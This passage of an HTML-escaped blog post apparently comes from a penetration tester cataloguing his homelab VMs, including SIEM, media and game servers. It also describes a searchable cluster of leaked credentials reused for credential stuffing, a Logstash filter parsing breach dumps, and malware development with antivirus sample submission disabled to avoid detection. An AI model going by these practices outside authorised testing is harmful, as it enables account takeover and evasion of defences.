  &lt;p&gt;&lt;strong&gt;Disclaimer, this is subject to change… very often and very quickly!&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2020/05/what-virtual-machines-am-i-running/home_network-securitybits-v2.5.png&quot; alt=&quot;The 'current' network architecture&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To start off everything that you can see is running under ESXi-6.7 on my VRTX, which is managed by vCenter-6.7. Though this will soon be upgraded to 7.0 as soon as VMware releases 7.0u1.&lt;/p&gt;

&lt;h2 id=&quot;hypervisor&quot;&gt;Hypervisor&lt;/h2&gt;
&lt;h3 id=&quot;dell-vrtx-aegir&quot;&gt;Dell VRTX (Aegir)&lt;/h3&gt;
&lt;p&gt;This is my main hypervisor server, basically a homelab in a box! the nifty thing about the VRTX is that you do have the storage as well as 4 blades in one 5u package! This makes it really convenient, although you kinda miss out on all the good homelab life, in regards to multiple rack servers and networking.&lt;/p&gt;

&lt;h4 id=&quot;blades&quot;&gt;Blades&lt;/h4&gt;
&lt;p&gt;Theres two sets of blades with identical hardware:&lt;br /&gt;
&lt;strong&gt;Eldir-01 / 02&lt;/strong&gt;&lt;br /&gt;
Dell M520&lt;br /&gt;
Xeon E5-2420v2&lt;br /&gt;
64GB DDR3 ECC-Dual&lt;br /&gt;
2x Seagate 146GB 15k SAS&lt;br /&gt;
&lt;strong&gt;Eldir-03 / 04&lt;/strong&gt;&lt;br /&gt;
Dell M520&lt;br /&gt;
2x Xeon E5-2407&lt;br /&gt;
44GB DDR3 ECC Dual Rank&lt;/p&gt;
&lt;h4 id=&quot;vm-storage&quot;&gt;VM Storage&lt;/h4&gt;
&lt;p&gt;The VRTX comes with 25 2,5” SAS Disk shelf! which makes it possible to have up 48TB of storage shared between the 4 blades!&lt;br /&gt;
Currently I have 9 drives, with 8 of them spanned in a Raid50 for 3,3TB and one in hot spare (in case one drive would break it would automatically re-silver).&lt;/p&gt;

&lt;h2 id=&quot;fileserver&quot;&gt;Fileserver&lt;/h2&gt;
&lt;h3 id=&quot;qnap-ts-832x&quot;&gt;QNAP TS-832X&lt;/h3&gt;
&lt;p&gt;While the R510 was a pretty potent server, it was quite redundant as any kind of fast storage since the VRTX had its own internal diskshelf. So I began to look for replacement, and landed on the QNAP Ts-832X with dual 10Gbps SFP+, and dual 1GbE. Together with 8 disk slots it became a pretty good bulk storage for backups of clients and server configs.
There’s currently 5 disks which are shucked WD Elements 10TB, so far they have been chugging along pretty well. And it also left me room for 3 additional drives before the next serious upgrade.&lt;/p&gt;

&lt;h2 id=&quot;virtual-machines&quot;&gt;Virtual Machines&lt;/h2&gt;
&lt;p&gt;Now that we got that out of the way, lets dive into the meat of this post.
I’ve split my VMs into a few different subnets to keep them organized!&lt;/p&gt;

&lt;h2 id=&quot;vmware&quot;&gt;VMWare&lt;/h2&gt;
&lt;h3 id=&quot;vcenter&quot;&gt;vCenter&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;assets/images/posts/2020/05/what-virtual-machines-am-i-running/vcenter_screenshot.png&quot; alt=&quot;vCenter Dashboard&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4 vCPU/16GB RAM/~200GB Disk&lt;br /&gt;
My vCenter is the main control hub for my homelab and its VMs, where all the provisioning happens, as well as the internal vmware network. It’s chomping RAM like nobody’s business, but it is necessary as I do not want to switch to Proxmox or Xen server.&lt;/p&gt;

&lt;h2 id=&quot;private&quot;&gt;Private&lt;/h2&gt;
&lt;p&gt;My Private stack is where I put the VMs that I do not want to have direct internet access and mainly where I put internal services.&lt;/p&gt;

&lt;h3 id=&quot;saltstack&quot;&gt;SaltStack&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;assets/images/posts/2020/05/what-virtual-machines-am-i-running/SaltStack-logo.png&quot; alt=&quot;SaltSTack Logo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2 vCPU/2GB Ram/100GB Disk&lt;br /&gt;
Many people have probably heard of puppet, chef and ansible… but maybe not &lt;a href=&quot;https://saltstack.com&quot;&gt;SaltStack&lt;/a&gt;. It works by a master-minion system, this is the master, and on each linux VM there is a minion process running. You can also use salt-ssh, which makes it login and run commands, which works, but you loose some of the functions such as the reactor-bus etc. which define actions/states that the minion will perform on changes. Now there’s a rather big debate on what orchestration tool that you should use. Granted there is a lot that’s already made for ansible, and it is popular and more heard of as well. The reason that I fell down into SaltStack is that I found it had all the features that I wanted from ansible, and then some. Suffice it to say that all the following virtual machines are provisioned to my vCenter using Salt-Cloud.&lt;/p&gt;

&lt;h3 id=&quot;siem--network-logging-solution&quot;&gt;SIEM / Network logging solution&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;assets/images/posts/2020/05/what-virtual-machines-am-i-running/Elastic-Stack.png&quot; alt=&quot;Elastic-Stack Architecture&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now this setup might warrant some comments about “overkill” (and probably its own post), but safe to say is that I am a huge elastic-stack fan. My cluster is a Hot-Warm architecture, with the addition of, if I ever need to, also do cold storage. Each of the nodes are properly secured, which isn’t the easiest task. All the log transfer, rotation etc. are being done by either syslog, or beats. I do run the whole suite of beats:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Filebeat, for every relevant file based log.&lt;/li&gt;
  &lt;li&gt;Auditbeat, security events such as file changes, user logins or processes.&lt;/li&gt;
  &lt;li&gt;Packetbeat, packets and netflow.&lt;/li&gt;
  &lt;li&gt;Metricbeat, Well basically what it says, it gathers metrics from VMs and Docker containers.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;siem-elasticsearch-master&quot;&gt;SIEM Elasticsearch Master&lt;/h4&gt;
&lt;p&gt;2 vCPU/4GB Ram/32GB Disk&lt;br /&gt;
The Elastic-stack Master nodes are the glue that holds the cluster together, and if you didn’t know… they LOVE ram! Now why 3 you might ask? Split-brain syndrome! 3 is the recommended minimum number in order to not have a split-brain syndrome, which happens when you have an even number of masters and what might happen is a 2 sided argument where both sides are even. In order to tip the scale Elastic recommends that you have an uneven number of nodes. Luckily the master nodes are usually not the largest VMs that you have so it doesn’t hurt to have 3 or 5 depending on the use case. Also note that these are &lt;strong&gt;only&lt;/strong&gt; responsible for the Mastering of the other nodes, so they are not responsible for ingesting data, storing data or manipulating data.&lt;/p&gt;

&lt;h4 id=&quot;siem-elasticsearch-hot&quot;&gt;SIEM Elasticsearch Hot&lt;/h4&gt;
&lt;p&gt;4 vCPU/6GB Ram/250GB Disk&lt;br /&gt;
The “Hot” nodes have two main functions, ingesting logs, and storing a couple days of logs, on several shards on the hot nodes. These usually reside on SSD storage and are the main nodes in the cluster that handles searching the most relevant data. Depending on your lograte you might want to have it on SSDs and on 10gig network. In my environment I have ~300events / second, and a daily index is around 10-25GB, and a daily index is held on a hot node for 14 days before its rotated to a warm node.&lt;/p&gt;

&lt;h4 id=&quot;siem-elasticsearch-warm&quot;&gt;SIEM Elasticsearch Warm&lt;/h4&gt;
&lt;p&gt;4 vCPU/6GB Ram/250GB Disk&lt;br /&gt;
A warm node is only responsible for searching data, and storing data long term. These nodes are usually on a regular spinning disk as that kind of storage are cheaper, and a user does not generally hit the warm indexes as often as the hot ones. For my setup, depending on the index I keep for example my Filebeat (syslog) for 90days, which may seem long, but mangling data is kind of fun!&lt;/p&gt;

&lt;h4 id=&quot;siem-logstash&quot;&gt;SIEM Logstash&lt;/h4&gt;
&lt;p&gt;2 vCPU/2GB Ram/32GB Disk&lt;br /&gt;
Now other Elastic-Stack purists might yell at me for running beats through logstash. But I have some reasons, mainly I like to have one interface for ingesting logs! I do run SNMP fetching, syslog mangling, ingesting iDRAC logs etc. to my logstash, which would just makes the firewall rules easier to manage as it only exposes the logstash ports externally from the cluster! Doing it this way also load balances the lograte rather nicely.&lt;/p&gt;

&lt;h4 id=&quot;siem-kibana&quot;&gt;SIEM Kibana&lt;/h4&gt;
&lt;p&gt;4 vCPU/4GB Ram/32GB Disk&lt;br /&gt;
Every logging solution, wether it be influx, nagios etc. need a front end. Elastic-Stacks solution is Kibana, this also contains apps such as Development tools for API-calls, SIEM detection, Health metric visualization etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2020/05/what-virtual-machines-am-i-running/kibana_dashboard.png&quot; alt=&quot;Kibana Metricbeat Dashboard&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;breachsearch-elastic-cluster&quot;&gt;Breachsearch Elastic Cluster&lt;/h3&gt;
&lt;p&gt;So this setup is not much more different then what the SIEM solution looks like, except its not in a Hot-Warm configuration as in this cluster there is only “hot” data. Though the purpose is a bit different, I do enjoy my fair share of data breaches. And I have a couple times referenced those breaches in engagements, and found working passwords (Credential stuffing). Which is always fun! But one dark secret of mine is that I like as with the SIEM Cluster to mangle and pivot data all manner of ways, and I love password statistics, so this was a extremely fun project. How I specifically did this setup, with code examples and the Goose.Lab database will be provided in an upcoming blogpost which will be linked &lt;a href=&quot;http://YouShouldNeverClickOnRandomLinks.com&quot;&gt;Placeholder&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&quot;breachsearch-master&quot;&gt;Breachsearch Master&lt;/h4&gt;
&lt;p&gt;2 vCPU/4GB RAM/32GB Disk&lt;br /&gt;
Again, these are the brains of the operation, and they are running a tight ship. I have 3 Masters in order to avoid the Split-brain syndrome,&lt;/p&gt;

&lt;h4 id=&quot;breachsearch-hot&quot;&gt;Breachsearch Hot&lt;/h4&gt;
&lt;p&gt;6 vCPU/6GB RAM/250GB Disk
Need somewhere to hold the data. While I don’t have a Hot-Warm architecture for the Breachsearch cluster, it still acts as a hot node in regards to shard count. The data is also not indexed depending on the timestamp, but more like a straight database where you make searches on all data at the same time, hence these have a bit more resources then the SIEM cluster.&lt;/p&gt;

&lt;h4 id=&quot;breachsearch-kibana&quot;&gt;Breachsearch Kibana&lt;/h4&gt;
&lt;p&gt;4 vCPU/4GB RAM/32GB Disk
The main function of this VM is only to visualize the data in a proper way.&lt;/p&gt;

&lt;h4 id=&quot;breachsearch-ingest&quot;&gt;Breachsearch Ingest&lt;/h4&gt;
&lt;p&gt;4 vCPU/4GB RAM/100GB Disk&lt;br /&gt;
Now this is where it gets interesting, and where most of the data ingestion happens. The field inexation happens in a Logstash dissect filter which looks like:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;filter{
  dissect {
    mapping =&amp;gt; { &quot;message&quot; =&amp;gt; &quot;%{DumpName} %{Username} %{Password} %{Hash} %{Hashformat} %{Cracked} %{Domain}&quot; }
  }
  mutate{
    remove_field =&amp;gt; [ &quot;host&quot;, &quot;port&quot; ]
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Which basically takes a netcat session, or a specific file and splits the message into different headers and indexes the data into the proper elastic-index. I’m also positive that this could be achieved with a Filebeat processor, but im lazy(-ish) and I know Logstash!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/posts/2020/05/what-virtual-machines-am-i-running/breachsearch_dashboard.png&quot; alt=&quot;Breachsearch Dashboard for Goose.Lab&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;tigv-stack&quot;&gt;TIG(V)-Stack&lt;/h3&gt;
&lt;p&gt;So yeah, I broke and actually started using the TIG Stack again, not because my ELK stack is bad or anything but more because Telegraf and Varken are easier to integrate to more “esoteric” devices, such as BSD, Switches, UniFi etc.&lt;/p&gt;
&lt;h4 id=&quot;telegraf&quot;&gt;Telegraf&lt;/h4&gt;
&lt;p&gt;2 vCPU/2GB RAM/32GB Disk&lt;br /&gt;
Telegraf is the TIG stacks application which pulls the data and metrics from devices, such as iDRAC, or switch port speeds from switches and routers, and seamlessly puts that data into InfluxDB so that it can be displayed with Grafana.&lt;/p&gt;

&lt;h4 id=&quot;influxdb&quot;&gt;InfluxDB&lt;/h4&gt;
&lt;p&gt;4 vCPU/4GB RAM/100GB Disk&lt;br /&gt;
This is the “I” in the TIG stack, and InfluxDB is the de facto standard time series database for this kind of implementation. The VM currently holds two different databases:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Telegraf - A database which holds the direct output of the Telegraf VM, for example; VMWare Metrics, Switch and SNMP Metrics.&lt;/li&gt;
  &lt;li&gt;Varken - The database for Varken, which collects metrics and items from Radarr, Sonarr, Tautulli, Ombi and UniFi.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;varken&quot;&gt;Varken&lt;/h4&gt;
&lt;p&gt;2 vCPU/2GB RAM/32GB Disk&lt;br /&gt;
&lt;a href=&quot;https://github.com/Boerderij/Varken&quot;&gt;Varken&lt;/a&gt; is a tool which pulls data and metrics from applications like, radarr, lidarr, sonarr Unifi etc. It is a cool project and currently a really effective way to see the requests which comes from Ombi and its users.&lt;/p&gt;

&lt;h3 id=&quot;php-ipam&quot;&gt;PHP Ipam&lt;/h3&gt;
&lt;p&gt;1 vCPU/1GB Ram/32GB Disk&lt;br /&gt;
Since I like organization, this was one of the best VMs that I could create. As this allows me to have my IP address space organized also makes it easy to look up where I have free addresses for new projects.&lt;/p&gt;

&lt;h3 id=&quot;gitlab-runner&quot;&gt;Gitlab runner&lt;/h3&gt;
&lt;p&gt;2 vCPU/2GB Ram/250GB Disk&lt;br /&gt;
This is actually the only docker host that I have, and is a companion to my gitlab server. This is responsible to run the pipelines in docker containers that are defined in gitlab. wether it can be to build malware stubs or compile malicious binaries (Yeah I’m a pentester, what did you expect).&lt;/p&gt;

&lt;h3 id=&quot;afl-master&quot;&gt;AFL-Master&lt;/h3&gt;
&lt;p&gt;4 vCPU/4GB RAM/100GB Disk&lt;br /&gt;
Since I do a bunch of work in Penetration Testing etc. I thought that having a dedicated, easily re-provisioned Fuzzing VM would be beneficial. This is a machine that automatically installs &lt;a href=&quot;https://lcamtuf.coredump.c/afl&quot;&gt;AFL&lt;/a&gt;, and is usually one of those that are just best left be to do its thing.&lt;br /&gt;
&lt;img src=&quot;assets/images/posts/2020/05/what-virtual-machines-am-i-running/AmericanFuzzyLoop.png&quot; alt=&quot;AFL Currently fuzzing for De-serialization bugs in PHP-7.12&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;jotta-cloud-backup&quot;&gt;Jotta Cloud-Backup&lt;/h3&gt;
&lt;p&gt;2 vCPU/4GB RAM/40GB Disk&lt;br /&gt;
This is the only Non-Testing Windows VM that I run, because through my ISP and my contract I get a “Unlimited Cloud Backup solution” to JottaCloud… did I mention that I got it for free? You can probably also guess what drives are currently mounted to be backed up!&lt;/p&gt;

&lt;h3 id=&quot;plex-server&quot;&gt;Plex server&lt;/h3&gt;
&lt;p&gt;4 vCPU/4GB Ram/100GB Disk&lt;br /&gt;
This is my only plex server for movies and tv-series. Since I travel 2-3 days sometimes, making hotel rooms boring! so this is accessible for me using my plex account. All the media is stored on Nidhoggr(NAS) and accessed over SMB.&lt;/p&gt;

&lt;h3 id=&quot;transmission&quot;&gt;Transmission&lt;/h3&gt;
&lt;p&gt;2 vCPU/2GB Ram/250GB Disk&lt;br /&gt;
A torrent client with a WebUI, which is running over a VPN…. for Linux ISOs…&lt;/p&gt;

&lt;h3 id=&quot;tautulli&quot;&gt;Tautulli&lt;/h3&gt;
&lt;p&gt;2 vCPU/2GB Ram/32GB Disk&lt;br /&gt;
This one provides me some monitoring and statistics on movies and series on the Plex media server. This is not being used so much, but graphs are fun!&lt;/p&gt;

&lt;h3 id=&quot;radarr&quot;&gt;Radarr&lt;/h3&gt;
&lt;p&gt;2 vCPU/2GB Ram/100GB Disk&lt;br /&gt;
A VM which will organize and keep track of all your Movies, and also hooks into the download client so that it gets the highest quality.&lt;/p&gt;

&lt;h3 id=&quot;sonarr&quot;&gt;Sonarr&lt;/h3&gt;
&lt;p&gt;2 vCPU/2GB Ram/100GB Disk&lt;br /&gt;
It’s a similar too as Radarr, but for TV Shows, keeping track of your episodes and series automatically.&lt;/p&gt;

&lt;h3 id=&quot;bazarr&quot;&gt;Bazarr&lt;/h3&gt;
&lt;p&gt;2 vCPU/2GB Ram/100GB Disk&lt;br /&gt;
Bazarr hooks up to your Radarr and Sonarr, and will download the correct subtitles for your specific languages and media!&lt;/p&gt;

&lt;h3 id=&quot;jackett&quot;&gt;Jackett&lt;/h3&gt;
&lt;p&gt;2 vCPU/2GB Ram/100GB Disk&lt;br /&gt;
Jackett hooks into the Radarr and Sonarr VMs and just adds different trackers, and more options for finding the correct media.&lt;/p&gt;

&lt;h3 id=&quot;docker-01&quot;&gt;Docker 01&lt;/h3&gt;
&lt;p&gt;4 vCPU/4GB RAM/100GB Disk&lt;br /&gt;
So I finally caved and started messing with Docker a bit more for my network services, and I wont hide and say that I don’t like it! We’ll see how much of my running services that I actually will convert to containers, but its nice as some tooling likes to run on docker.&lt;br /&gt;
This Docker host is mainly for general containers, that should be in the private network and is not really touching or osting anything for the public web.&lt;/p&gt;
&lt;h4 id=&quot;portainerportainer&quot;&gt;Portainer/Portainer&lt;/h4&gt;
&lt;p&gt;So this is the docker master, it’s connected to all the docker hosts with the Portainer/Agent. Basically it is my interface to deploy containers across all docker hosts, and manage my containers.&lt;/p&gt;
&lt;h4 id=&quot;linuxserverheimdall&quot;&gt;Linuxserver/Heimdall&lt;/h4&gt;
&lt;p&gt;Well, it was either this or organizr. And I liked the name Heimdall better! And its a dashboard for all my applications.&lt;/p&gt;

&lt;h3 id=&quot;docker-02&quot;&gt;Docker 02&lt;/h3&gt;
&lt;p&gt;4 vCPU/4GB RAM/100GB Disk&lt;br /&gt;
So this Docker host is for those tools that I don’t really want to associate with my Home IP, therefor it is bound to the same VPN Connection as Transmission.&lt;/p&gt;
&lt;h4 id=&quot;cobbrcovenant&quot;&gt;Cobbr/Covenant&lt;/h4&gt;
&lt;p&gt;This is a development and testing suite for the Covenant C2 Framework, been mostly using Cobalt-strike as a C2 Framework. While it IS really potent, its still too much powershell based. So I am currently trying Covenant C2 as an alternative.&lt;/p&gt;
&lt;h4 id=&quot;yogeshojharengine&quot;&gt;Yogeshojha/Rengine&lt;/h4&gt;
&lt;p&gt;An Automated Recon Engine to do discovery on public accessible sites.&lt;br /&gt;
Link: &lt;a href=&quot;https://github.com/yogeshojha/rengine&quot;&gt;Rengine&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;ctdcspiderfoot&quot;&gt;Ctdc/Spiderfoot&lt;/h4&gt;
&lt;p&gt;An automated Open Source Intelligence Framework, which I use On and off of work!&lt;br /&gt;
Link: &lt;a href=&quot;https://github.com/smicallef/spiderfoot&quot;&gt;Spiderfoot&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;mpeppingcyberchef&quot;&gt;Mpepping/CyberChef&lt;/h4&gt;
&lt;p&gt;This is the Docker image of the British Intelligence GCHQ Web App that does simple and complex encoding/decoding operations. Mainly used as an internal tool for CTFs.&lt;br /&gt;
Link: &lt;a href=&quot;https://github.com/gchq/CyberChef&quot;&gt;Github/CyberChef&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;public--dmz&quot;&gt;Public / DMZ&lt;/h2&gt;
&lt;p&gt;This segment is where I put all my public facing applications, with rather strict firewall rule set which is based on host to host traffic.&lt;/p&gt;

&lt;h3 id=&quot;ombi&quot;&gt;Ombi&lt;/h3&gt;
&lt;p&gt;2 vCPU/2GB Ram/250GB Disk&lt;br /&gt;
This is a self hosted application where users can create requests for plex.&lt;/p&gt;

&lt;h3 id=&quot;docker-03&quot;&gt;Docker 03&lt;/h3&gt;
&lt;p&gt;4 vCPU/4GB RAM/100GB Disk&lt;br /&gt;
This host is in my Public/DMZ Segment and is the main docker host where I’ll host all my public websites.&lt;/p&gt;
&lt;h4 id=&quot;securitybitsjkk-webcalendar&quot;&gt;Securitybits/Jkk-Webcalendar&lt;/h4&gt;
&lt;p&gt;I am a member of a local rock climbing community, and have been for the last couple years hosted a small php web application for smartphones, which displays the club activities the coming 2 weeks in a nice format.&lt;/p&gt;

&lt;h3 id=&quot;gitlab&quot;&gt;Gitlab&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;assets/images/posts/2020/05/what-virtual-machines-am-i-running/GitLab-Logo.jpg&quot; alt=&quot;GitLab Logo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2 vCPU/4GB Ram/250GB Disk&lt;br /&gt;
Everyone needs somewhere to store their source code, this Gitlab instance is responsible to house my own projects which I do not want to have on any other SaaS solution (Github). I do a lot of security research, writing malware etc. for professional use. Working as a Pentester and Security Researcher I hate going out and compromising a client (on purpose and with authorization), and my malware is detected by signatures or even before execution time. Before I started hosting my own Gitlab, I did a test with creating a unseen custom backdoor, tested on a fully updated windows 10, upload it to a private repo, wait for a week and retest it on a &lt;strong&gt;fresh&lt;/strong&gt; windows 10 instance… detected, while yes it was not a ‘state of the art’ malware, but it was enough for me to question where I should store my research. Remember, the cloud is just someone else computer. I also store all the states and maps for SaltStack on my Gitlab, which makes it accessible even if my internet dies.&lt;/p&gt;

&lt;h3 id=&quot;nginx-reverse-proxy&quot;&gt;Nginx Reverse Proxy&lt;/h3&gt;
&lt;p&gt;2 vCPU/2GB RAM/32GB Disk
A simple reverse proxy for my different web services, nothing that’s out of the ordinary. This VM also handles Lets Encrypt TLS Certificates.&lt;/p&gt;

&lt;h3 id=&quot;grafana&quot;&gt;Grafana&lt;/h3&gt;
&lt;p&gt;So Grafana is the last component in the TIG(V)-Stack, an its the famous frontend that all homelabbers love to show off!&lt;/p&gt;

&lt;h2 id=&quot;gameservers&quot;&gt;Gameservers&lt;/h2&gt;
&lt;p&gt;So this is a network segment where I keep “Closed Public”-servers, as in those servers that people can access if they have access. And as the name implies this segment is mostly for gameservers that I’d like to share access to.&lt;/p&gt;

&lt;h3 id=&quot;oda-arma3&quot;&gt;ODA-Arma3&lt;/h3&gt;
&lt;p&gt;4 vCPU/6GB RAM/240GB Disk&lt;br /&gt;
So this is one of the first gameservers that I put up, and is a always on server for me and my friends to have our standing game nights on, as we do enjoy that “Milsim” gameplay of a ODA/SF Unit.&lt;/p&gt;

&lt;h3 id=&quot;dayz&quot;&gt;DayZ&lt;/h3&gt;
&lt;p&gt;4 vCPU/6GB RAM/240GB Disk&lt;br /&gt;
Same as the ODA-Arma3 server but this is for DayZ Standalone.&lt;/p&gt;

&lt;h3 id=&quot;takserver&quot;&gt;TakServer&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;assets/images/posts/2020/05/what-virtual-machines-am-i-running/TAK-CIV-Banner.png&quot; alt=&quot;TakServer Logo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2 vCPU/2GB RAM/100GB Disk&lt;br /&gt;
So ATAK-Civ has been one of those applications that I really wanted to try out for a long time. What it is, a Blue Force Tracker and information sharing app for Android and Windows. FreeTAKServer is built on a python3 Implementation of TakServer, which is lightweight and easy to run on much of any hardware that has pip and python. (Stay Tuned for a SaltStack installation script)&lt;/p&gt;

&lt;h3 id=&quot;wintak&quot;&gt;WinTAK&lt;/h3&gt;
&lt;p&gt;2 vCPU/4GB RAM/42GB Disk&lt;br /&gt;
Having the TakServer does nothing without also having clients to share the information with. The WinTAK server is a Windows based server where I can remote to using a VPN and have access to the TAK network wherever I go.&lt;/p&gt;

&lt;h3 id=&quot;rtmp&quot;&gt;RTMP&lt;/h3&gt;
&lt;p&gt;2 vCPU/4GB RAM/100GB Disk&lt;br /&gt;
RTMP Is a “Real-Time Messaging Protocol” which I am currently using to collect and share media streams from various types of cameras and applications. This is a NGINX implementation as I found that was the easiest to implement and run.&lt;/p&gt;

&lt;h3 id=&quot;mumble&quot;&gt;Mumble&lt;/h3&gt;
&lt;p&gt;2 vCPU/2GB RAM/32GB Disk&lt;br /&gt;
Mumble is one of those VoIP applications that are just simple and they work. This is for a project I’ve had in my head for a while and is dedicated to radio communication using hand held PMR Radios.&lt;/p&gt;

&lt;h2 id=&quot;malware&quot;&gt;Malware&lt;/h2&gt;
&lt;p&gt;Now for the fun stuff, my malware net is the most restrictive net that I have, basically only accessible from a VPN and only have a outbound monitored internet connection. This is also the Segment that have the VMs in highest rotation, for good reason. Its purpose is basically a safe place to detonate malware and reverse live samples.&lt;/p&gt;

&lt;h3 id=&quot;gooseflare&quot;&gt;GooseFlare&lt;/h3&gt;
&lt;p&gt;4 vCPU/8GB Ram/80GB Disk&lt;br /&gt;
There’s always 1-3 instances of FireEYEs Flare VM available in this net for malware research. If you haven’t heard of &lt;a href=&quot;https://github.com/fireeye/flare-vm&quot;&gt;FlareVM&lt;/a&gt; it’s a simple setup script for a windows VMs that contains most of all tools you’ll need in order to reverse engineer a malware. The script is actively maintained by pull requests and FireEYE, highly recommended if you are interested in reverse engineering.&lt;/p&gt;

&lt;h2 id=&quot;goosedev&quot;&gt;GooseDev&lt;/h2&gt;
&lt;p&gt;Much like the Malware segment, I have a segment for developing malware. I will put up another blog post specifically on this network and its hosts but the general idea is to have a network with hosts that have different AVs installed  and block by GPO and in the network firewall malware submissions to the mother ship.&lt;/p&gt;
&lt;h3 id=&quot;goosedev-1&quot;&gt;GooseDev&lt;/h3&gt;
&lt;p&gt;4 vCPU/8GB Ram/150GB Disk&lt;br /&gt;
A simple windows 10 Pro host, with Python and visual studio installed. Since a lot of malware and C2 framework have moved on from Powershell into a more unmonitored .NET and Powershell-Less execution, there was a need to have a development machine which was easily restored to an original state when a project was completed, so that there was no lingering artifacts. During Red-Team engagements this is also a Lab which goes through heavy modifications whenever we learn something new from the client, in order to mimic our target environment as good as can be to come out successful in the end. My current project is .NET DLL injections into memory for which I’m doing a small write up, stay tuned!&lt;/p&gt;
&lt;h3 id=&quot;goosetarget&quot;&gt;GooseTarget&lt;/h3&gt;
&lt;p&gt;2 vCPU/4GB Ram/60GB Disk&lt;br /&gt;
A standard windows 7/8/10 VM which is usually as default as can be, with the only modification is that I turn off sample submissions in the Group Policy so that I don’t burn my applications pre-engagement.&lt;/p&gt;

&lt;h2 id=&quot;gooselab&quot;&gt;GooseLab&lt;/h2&gt;
&lt;p&gt;Much like GooseDev subnet there’s GooseLab, which is more of a static environment and a small domain playground to test new attacks and applications in a more controlled domain. Whats currently missing is actually a logging solution, which will probably be another Elastic-Stack and Winlogbeat.&lt;/p&gt;
&lt;h3 id=&quot;goosesql&quot;&gt;GooseSQL&lt;/h3&gt;
&lt;p&gt;2 vCPU/4GB Ram/40GB Disk&lt;br /&gt;
Simple SQL Server with one database defined at the moment. Used for Authentication and some basic data storage for GooseWeb.&lt;/p&gt;
&lt;h3 id=&quot;gooseweb&quot;&gt;GooseWEB&lt;/h3&gt;
&lt;p&gt;2 vCPU/4GB Ram/40GB Disk&lt;br /&gt;
IIS Server that runs a small inventory management application connected to the SQL Database for authentication and data storage.&lt;/p&gt;
&lt;h3 id=&quot;goosedc&quot;&gt;GooseDC&lt;/h3&gt;
&lt;p&gt;2 vCPU/4GB Ram/40GB Disk&lt;br /&gt;
Domain controller for the domain “Goose.Lab” 20 users with different degrees of access. There’s also some small special case configurations in GPO, Groups and auth schemes which makes for an interesting Saturday evening of hacking.&lt;/p&gt;

&lt;h2 id=&quot;finishing-up&quot;&gt;Finishing up&lt;/h2&gt;
&lt;p&gt;So yeah, now I finally took the step and started using Docker to some extent. I can at least say that it is going to be a mainstay server in my VM stack, though I don’t know how much but at least for some toolings. But I’ll still use vCenter as the mainstay application to manage the VMs, and Portainer (or maybe take another step to Rancher) to manage my containers.&lt;br /&gt;
One might also ask where this blog is hosted? Actually it is on Github-Pages together with a small actions script which runs every time I make a push to the blog branch. If you want you can clone and repurpose the repo for your own blog, you can find the repo here: &lt;a href=&quot;https://github.com/Securitybits-io/blog.securitybits.io&quot;&gt;Securitybits Github&lt;/a&gt;&lt;br /&gt;
If you have read this far, Good job! and thank you, if you have any questions don’t hesitate to contact me!&lt;/p&gt;

&lt;h3 id=&quot;changelog&quot;&gt;Changelog&lt;/h3&gt;
&lt;h5 id=&quot;2021-02-19&quot;&gt;2021-02-19&lt;/h5&gt;
&lt;p&gt;Virtual Machine Changes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Added: ODA-Arma3&lt;/li&gt;
  &lt;li&gt;Added: DayZ&lt;/li&gt;
  &lt;li&gt;Added: WinTAK&lt;/li&gt;
  &lt;li&gt;Added: Mumble&lt;/li&gt;
  &lt;li&gt;Added: TakServer&lt;/li&gt;
  &lt;li&gt;Added: RTMP Server&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;2020-10-20&quot;&gt;2020-10-20&lt;/h5&gt;
&lt;p&gt;Hardware changes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Removed Cisco C2960-48TS-S in favor to a Ubiquiti 48-Port Switch&lt;/li&gt;
  &lt;li&gt;Added Raspberry Pi 4GB Unifi Controller&lt;/li&gt;
  &lt;li&gt;Added Ubiquiti NanoHD Access Point&lt;/li&gt;
  &lt;li&gt;Switched Dell R510 FreeNAS to a Qnap TS-832X&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Virtual Machine Changes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Added: AFL-Master&lt;/li&gt;
  &lt;li&gt;Added: BreachSearch cluster&lt;/li&gt;
  &lt;li&gt;Added: Jotta Cloud-Backup (Windows VM)&lt;/li&gt;
  &lt;li&gt;Added: InfluxDB&lt;/li&gt;
  &lt;li&gt;Added: Varken&lt;/li&gt;
  &lt;li&gt;Added: Telegraf&lt;/li&gt;
  &lt;li&gt;Added: Grafana&lt;/li&gt;
  &lt;li&gt;Added: Docker-host 01/02/03&lt;/li&gt;
